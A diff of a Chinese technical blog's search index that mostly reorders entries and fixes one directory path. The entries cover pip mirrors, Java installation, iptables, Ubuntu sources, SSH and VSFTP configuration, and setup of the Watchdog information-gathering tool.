@@ -1,32 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>pip 更换源</title>
-    <url>/2021/02/09/Python/pip/pip/</url>
-    <content><![CDATA[<h2 id="pip-更换成国内源"><a href="#pip-更换成国内源" class="headerlink" title="pip 更换成国内源"></a>pip 更换成国内源</h2><p>在 <code>C:\Users\【用户名】\AppData\Roaming</code> 目录下新建 <code>pip</code> 文件夹，然后在文件夹内新建 <code>pip.ini</code> 文件</p>
-<p>文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 60000</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">use-mirrors &#x3D; true</span><br><span class="line">mirrors &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
-<h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  阿里云</span><br><span class="line">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">#  中国科技大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  豆瓣(douban)</span><br><span class="line">http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line">#  清华大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  中国科学技术大学</span><br><span class="line">http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>设置 JAVA 环境</title>
-    <url>/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  更新软件包列表</span><br><span class="line">sudo apt-get update</span><br><span class="line">#  安装 openjdk-8-jdk</span><br><span class="line">sudo apt-get install openjdk-8-jdk -y</span><br><span class="line">#  查看 java 版本</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Iptables</title>
     <url>/2021/02/09/Linux/iptables/iptables/</url>
     <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>netfilter/iptables</code>（简称 <code>iptables</code>）组成 Linux 平台下的包过滤防火墙</p>
@@ -70,6 +44,18 @@
       </tags>
   </entry>
   <entry>
+    <title>设置 JAVA 环境</title>
+    <url>/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  更新软件包列表</span><br><span class="line">sudo apt-get update</span><br><span class="line">#  安装 openjdk-8-jdk</span><br><span class="line">sudo apt-get install openjdk-8-jdk -y</span><br><span class="line">#  查看 java 版本</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ubuntu更换软件源</title>
     <url>/2021/02/10/Linux/ubuntu%20%E6%9B%B4%E6%8D%A2%E8%BD%AF%E4%BB%B6%E6%BA%90/%E9%85%8D%E7%BD%AE%E6%BA%90/</url>
     <content><![CDATA[<p>备份源文件 <code>sudo cp -p /etc/apt/sources.list /etc/apt/sources.list.bak_2020.10.13</code></p>
@@ -85,6 +71,20 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pip 更换源</title>
+    <url>/2021/02/09/Python/pip/pip/</url>
+    <content><![CDATA[<h2 id="pip-更换成国内源"><a href="#pip-更换成国内源" class="headerlink" title="pip 更换成国内源"></a>pip 更换成国内源</h2><p>在 <code>C:\Users\【用户名】\AppData\Roaming</code> 目录下新建 <code>pip</code> 文件夹，然后在文件夹内新建 <code>pip.ini</code> 文件</p>
+<p>文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 60000</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">use-mirrors &#x3D; true</span><br><span class="line">mirrors &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
+<h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  阿里云</span><br><span class="line">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">#  中国科技大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  豆瓣(douban)</span><br><span class="line">http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line">#  清华大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  中国科学技术大学</span><br><span class="line">http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -283,7 +283,7 @@
 <p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-2.png"></p>
 <h3 id="添加-shodan-api"><a href="#添加-shodan-api" class="headerlink" title="添加 shodan api"></a>添加 shodan api</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  在域名扫描的工具模块内添加 shodan api（将此处命令中的 test 替换成 api）</span><br><span class="line">sudo sed -i &#39;s&#x2F;xxxxxx&#x2F;test&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py</span><br></pre></td></tr></table></figure>
 <p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/shodan_api.png"></p>
-<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）</span><br><span class="line">sudo sed -i &#39;s&#x2F;qazxsw@123&#x2F;12345678&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;app.py</span><br><span class="line">#  配置环境变量</span><br><span class="line">cd &#x2F;Watchdog</span><br><span class="line">export FLASK_APP&#x3D;app.py:APP</span><br><span class="line">#  查看帮助文档</span><br><span class="line">sudo flask --help</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户（如没修改账号跟密码则默认为：root&#x2F;qazxsw@123）</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
+<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）</span><br><span class="line">sudo sed -i &#39;s&#x2F;qazxsw@123&#x2F;12345678&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;app.py</span><br><span class="line">#  配置环境变量</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">export FLASK_APP&#x3D;app.py:APP</span><br><span class="line">#  查看帮助文档</span><br><span class="line">sudo flask --help</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户（如没修改账号跟密码则默认为：root&#x2F;qazxsw@123）</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
 <p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/start.png"></p>
 <h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><h3 id="添加厂商"><a href="#添加厂商" class="headerlink" title="添加厂商"></a>添加厂商</h3><p>运行脚本前需添加厂商</p>
 <p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-1.png"></p>
@@ -558,38 +558,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SSH</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/</url>
-    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSH 是为远程登陆会话和其他网络服务提供安全性的协议</p>
-<p>默认端口号为：<code>22</code><br>客户端配置文件：<code>/etc/ssh/ssh_config</code><br>服务端配置文件：<code>/etc/ssh/sshd_config</code></p>
-<h2 id="二、ssh-config"><a href="#二、ssh-config" class="headerlink" title="二、ssh_config"></a>二、ssh_config</h2><p><code>ssh_config</code> 配置文件常用参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host *			#  有效的主机（多个主机可用空格隔， “*” 表示所有）</span><br><span class="line">ForwardAgent no	#  连接是否经过代理验证（如果是）转发给远程计算机</span><br><span class="line">ForwardX11 no	#  连接受否被自动重定向到安全的通道和显示集</span><br><span class="line">RhostsRSAAuthentication no	#  不使用 RSA 算法基于 rhosts 的安全验证（仅 Version 1 版本使用）</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">PasswordAuthentication yes	#  使用口令验证</span><br><span class="line">HostbasedAuthentication no	#  与 RhostsRSAAuthentication 类似（Version2 使用）。</span><br><span class="line">GSSAPIAuthentication no		#  是否允许使用基于 GSSAPI 的用户认证（默认值为 ”yes”，仅用于 Version2）</span><br><span class="line">BatchMode no			#  如为 “yes“，passphrase&#x2F;password（交互式输入口令）的提示将被禁止</span><br><span class="line">CheckHostIP yes			#  设置 SSH 是否检查看连接到服务器的主机的 IP 地址以防止 DNS 欺骗（建议设置为 “yes“）</span><br><span class="line">AddressFamily any		#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ConnectTimeout 0		#  设置连接超时时间</span><br><span class="line">StrictHostKeyChecking ask       #  如果设置为 ”yes“，则不会自动把计算机的密钥加入 ”HOME&#x2F;.ssh&#x2F;known_hosts&quot; 文件，并且以一旦计算机的密钥发生了变化，就拒绝连接</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;identity	#  设置从哪个文件读取用户的 RSA 安全验证标识</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ecdsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ed25519</span><br><span class="line">Port 22			#  设置端口号</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">Cipher 3des		#  设置加密用的密码</span><br><span class="line">Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc	#  指定 Version2 使用的加密算法（多个算法之间使用逗号分隔）</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160	#  制定允许在 Version2 中使用哪些消息摘要算法来进行数据校验</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="三、sshd-config"><a href="#三、sshd-config" class="headerlink" title="三、sshd_config"></a>三、sshd_config</h2><p><code>sshd_config</code> 配置文件常用参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  常用</span><br><span class="line">Port 22			#  端口号</span><br><span class="line">AddressFamily any	#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ListenAddress 0.0.0.0	#  监听地址（0.0.0.0 表示所有地址）</span><br><span class="line">ListenAddress ::		#  监听地址（IPv6 地址）</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">LogLevel INFO		#  日志等级（QUIET, FATAL, ERROR, INFO, VERBOSE, DEBUG, DEBUG1, DEBUG2, and DEBUG3）</span><br><span class="line">UserDNS no		#  禁止DNS反向解析</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">PermitRootLogin no		#  禁止root用户登录</span><br><span class="line">PermitEmptyPasswords no 	#  禁止空密码用户登录</span><br><span class="line">LoginGraceTime 2m	#  登录验证时间为2分钟</span><br><span class="line">MaxAuthTries 6		#  最大重试次数6次</span><br><span class="line">AllowUsers steven	#  只允许 steven 用户登录</span><br><span class="line">DenyUsers steven	#  不允许登录用户 steven</span><br><span class="line"></span><br><span class="line">#  验证</span><br><span class="line">PasswordAuthentication yes	#  启用密码验证（如配置密钥登录，则需关闭此项）</span><br><span class="line">PubkeyAuthentication yes		#  启用密匙验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys		#  指定公钥数据库文件（用于密钥登陆）</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh 是 openssh 套件中的客户端连接工具</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-A	#  开启认证代理连接转发功能</span><br><span class="line">-a	#  关闭认证代理连接转发功能</span><br><span class="line">-b	#  使用本机指定地址作为对应连接的源 IP 地址</span><br><span class="line">-C	#  请求压缩所有数据</span><br><span class="line">-F	#  指定 ssh 指令的配置文件</span><br><span class="line">-f	#  后台执行 ssh 指令</span><br><span class="line">-g	#  允许远程主机连接主机</span><br><span class="line">-i	#  指定身份文件</span><br><span class="line">-l	#  指定连接远程服务器登陆用户名</span><br><span class="line">-N	#  不执行远程指令</span><br><span class="line">-o	#  指定配置选项</span><br><span class="line">-p	#  指定远程服务器的端口</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-X	#  开启 X11 转发功能</span><br><span class="line">-x	#  关闭 X11 转发功能</span><br><span class="line">-y	#  开启信任 X11 转发功能</span><br></pre></td></tr></table></figure>
-<h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><p>ssh-keygen 命令用于为 ssh 生成、管理和转换认证密钥</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh-keygene 常用参数</span><br><span class="line">-C	#  添加注释</span><br><span class="line">-b	#  指定密钥长度</span><br><span class="line">-e	#  读取openssh 的私钥或公钥文件</span><br><span class="line">-f	#  指定用来保存密钥的文件名</span><br><span class="line">-i	#  读取未加密的 ssh-v2 兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示 openssh 见阿荣的私钥&#x2F;公钥</span><br><span class="line">-l	#  显示公钥文件的指纹数据</span><br><span class="line">-N	#  提供一个新密码</span><br><span class="line">-P	#  提供一个旧密码</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-t	#  指定要创建的密钥类型（RSA、DSA，默认为 RSA）</span><br></pre></td></tr></table></figure>
-<h3 id="ssh-cocpy-id"><a href="#ssh-cocpy-id" class="headerlink" title="ssh-cocpy-id"></a>ssh-cocpy-id</h3><p>ssh-copy-id 命令用于把本地主机的公钥复制到远程主机的 /root/.ssh/authorized_keys 文件中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-cocpy-id 常用参数</span><br><span class="line">-i	#  指定公钥文件</span><br></pre></td></tr></table></figure>
-<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>加密的方式在本地的主机和远程主机之间复制文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  scp 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-B	#  以批处理模式运行</span><br><span class="line">-C	#  使用压缩</span><br><span class="line">-F	#  指定 ssh 配置文件</span><br><span class="line">-i	#  identity_file 从指定文件中读取传输时使用的密钥文件</span><br><span class="line">-l	#  指定宽带限制</span><br><span class="line">-o	#  指定使用的 ssh 选项</span><br><span class="line">-P	#  指定远程主机的端口号</span><br><span class="line">-p	#  保留文件的最后修改时间，最后访问时间和权限模式</span><br><span class="line">-q	#  不显示复制进度</span><br><span class="line">-r	#  以递归方式复制</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="五、配置密钥登陆"><a href="#五、配置密钥登陆" class="headerlink" title="五、配置密钥登陆"></a>五、配置密钥登陆</h2><h3 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改服务端配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PasswordAuthentication no	#  关闭密码验证</span><br><span class="line">PubkeyAuthentication yes	#  启用密钥验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br></pre></td></tr></table></figure>
-<h3 id="2、在客户端生成密钥"><a href="#2、在客户端生成密钥" class="headerlink" title="2、在客户端生成密钥"></a>2、在客户端生成密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">    指定私钥保存的路径及文件名（如不指定则默认为 &#x2F;root&#x2F;.ssh&#x2F;id_rsa）</span><br><span class="line">    密钥密码，最少五个字符（用于密钥连接时候使用，如不输入则可免密登陆）</span><br><span class="line">    确认密码</span><br><span class="line">    确完后自动在密钥文件所在位置创建 .pub 的公钥文件</span><br><span class="line"></span><br><span class="line">#  文件简介</span><br><span class="line">id_rsa		#  私钥文件</span><br><span class="line">id_rsa.pub	#  公钥文件</span><br><span class="line">authorized_keys	#  服务端公钥文件</span><br><span class="line">known_hosts	#  确认过公钥指纹的可信服务器列表的文件</span><br><span class="line">config		#  指定不同域名使用哪个密钥的配置文件</span><br></pre></td></tr></table></figure>
-<h3 id="3、上传公钥到服务端"><a href="#3、上传公钥到服务端" class="headerlink" title="3、上传公钥到服务端"></a>3、上传公钥到服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i id_rsa.pub root@192.168.1.123	#  将公钥上传到服务器（会自动在服务器 &#x2F;root&#x2F;.ssh&#x2F; 目录下创建 authorized_keys 文件）</span><br><span class="line"></span><br><span class="line">#  如前一行报错则可用 scp 命令拷贝</span><br><span class="line">#  将 .11 主机上的 id_rsa.pub 拷贝到指定目录并更名为 authorized_keys（服务端输入）</span><br><span class="line">scp -P 2222 root@10.1.82.11:&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">#  或</span><br><span class="line">#  将本地主机上的 id_rsa.pub 文件拷贝到 .11 主机上并更名为 authorized_keys（客户端输入）</span><br><span class="line">scp -P 2222 &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@10.1.82.12:&#x2F;root&#x2F;.ssh&#x2F;authorized_keys </span><br></pre></td></tr></table></figure>
-<h3 id="4、连接"><a href="#4、连接" class="headerlink" title="4、连接"></a>4、连接</h3><p>如设置了公钥密码则需输入公钥密码，如没设置公钥密码则可免密登陆</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 root@192.168.1.123</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VSFTP</title>
     <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/</url>
     <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信</p>
@@ -643,6 +611,91 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSH</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSH 是为远程登陆会话和其他网络服务提供安全性的协议</p>
+<p>默认端口号为：<code>22</code><br>客户端配置文件：<code>/etc/ssh/ssh_config</code><br>服务端配置文件：<code>/etc/ssh/sshd_config</code></p>
+<h2 id="二、ssh-config"><a href="#二、ssh-config" class="headerlink" title="二、ssh_config"></a>二、ssh_config</h2><p><code>ssh_config</code> 配置文件常用参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host *			#  有效的主机（多个主机可用空格隔， “*” 表示所有）</span><br><span class="line">ForwardAgent no	#  连接是否经过代理验证（如果是）转发给远程计算机</span><br><span class="line">ForwardX11 no	#  连接受否被自动重定向到安全的通道和显示集</span><br><span class="line">RhostsRSAAuthentication no	#  不使用 RSA 算法基于 rhosts 的安全验证（仅 Version 1 版本使用）</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">PasswordAuthentication yes	#  使用口令验证</span><br><span class="line">HostbasedAuthentication no	#  与 RhostsRSAAuthentication 类似（Version2 使用）。</span><br><span class="line">GSSAPIAuthentication no		#  是否允许使用基于 GSSAPI 的用户认证（默认值为 ”yes”，仅用于 Version2）</span><br><span class="line">BatchMode no			#  如为 “yes“，passphrase&#x2F;password（交互式输入口令）的提示将被禁止</span><br><span class="line">CheckHostIP yes			#  设置 SSH 是否检查看连接到服务器的主机的 IP 地址以防止 DNS 欺骗（建议设置为 “yes“）</span><br><span class="line">AddressFamily any		#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ConnectTimeout 0		#  设置连接超时时间</span><br><span class="line">StrictHostKeyChecking ask       #  如果设置为 ”yes“，则不会自动把计算机的密钥加入 ”HOME&#x2F;.ssh&#x2F;known_hosts&quot; 文件，并且以一旦计算机的密钥发生了变化，就拒绝连接</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;identity	#  设置从哪个文件读取用户的 RSA 安全验证标识</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ecdsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ed25519</span><br><span class="line">Port 22			#  设置端口号</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">Cipher 3des		#  设置加密用的密码</span><br><span class="line">Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc	#  指定 Version2 使用的加密算法（多个算法之间使用逗号分隔）</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160	#  制定允许在 Version2 中使用哪些消息摘要算法来进行数据校验</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="三、sshd-config"><a href="#三、sshd-config" class="headerlink" title="三、sshd_config"></a>三、sshd_config</h2><p><code>sshd_config</code> 配置文件常用参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  常用</span><br><span class="line">Port 22			#  端口号</span><br><span class="line">AddressFamily any	#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ListenAddress 0.0.0.0	#  监听地址（0.0.0.0 表示所有地址）</span><br><span class="line">ListenAddress ::		#  监听地址（IPv6 地址）</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">LogLevel INFO		#  日志等级（QUIET, FATAL, ERROR, INFO, VERBOSE, DEBUG, DEBUG1, DEBUG2, and DEBUG3）</span><br><span class="line">UserDNS no		#  禁止DNS反向解析</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">PermitRootLogin no		#  禁止root用户登录</span><br><span class="line">PermitEmptyPasswords no 	#  禁止空密码用户登录</span><br><span class="line">LoginGraceTime 2m	#  登录验证时间为2分钟</span><br><span class="line">MaxAuthTries 6		#  最大重试次数6次</span><br><span class="line">AllowUsers steven	#  只允许 steven 用户登录</span><br><span class="line">DenyUsers steven	#  不允许登录用户 steven</span><br><span class="line"></span><br><span class="line">#  验证</span><br><span class="line">PasswordAuthentication yes	#  启用密码验证（如配置密钥登录，则需关闭此项）</span><br><span class="line">PubkeyAuthentication yes		#  启用密匙验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys		#  指定公钥数据库文件（用于密钥登陆）</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh 是 openssh 套件中的客户端连接工具</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-A	#  开启认证代理连接转发功能</span><br><span class="line">-a	#  关闭认证代理连接转发功能</span><br><span class="line">-b	#  使用本机指定地址作为对应连接的源 IP 地址</span><br><span class="line">-C	#  请求压缩所有数据</span><br><span class="line">-F	#  指定 ssh 指令的配置文件</span><br><span class="line">-f	#  后台执行 ssh 指令</span><br><span class="line">-g	#  允许远程主机连接主机</span><br><span class="line">-i	#  指定身份文件</span><br><span class="line">-l	#  指定连接远程服务器登陆用户名</span><br><span class="line">-N	#  不执行远程指令</span><br><span class="line">-o	#  指定配置选项</span><br><span class="line">-p	#  指定远程服务器的端口</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-X	#  开启 X11 转发功能</span><br><span class="line">-x	#  关闭 X11 转发功能</span><br><span class="line">-y	#  开启信任 X11 转发功能</span><br></pre></td></tr></table></figure>
+<h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><p>ssh-keygen 命令用于为 ssh 生成、管理和转换认证密钥</p>
